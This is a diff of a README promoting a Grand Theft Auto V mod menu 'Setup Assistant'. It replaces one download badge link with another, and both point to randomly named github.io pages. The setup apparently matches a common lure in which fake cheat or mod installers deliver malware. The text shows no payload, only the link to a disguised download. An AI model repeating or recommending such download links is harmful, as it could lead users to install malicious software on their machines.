@@ -5,7 +5,7 @@ Boost your single-player or modding sandbox experience in Grand Theft Auto V wit
 ---
 
 🔘 **Download Setup Assistant:**  
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://backmeten1po.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://calleonnbdi.github.io/.github/Kiddions-Mod-Menu)
 
 ---
 
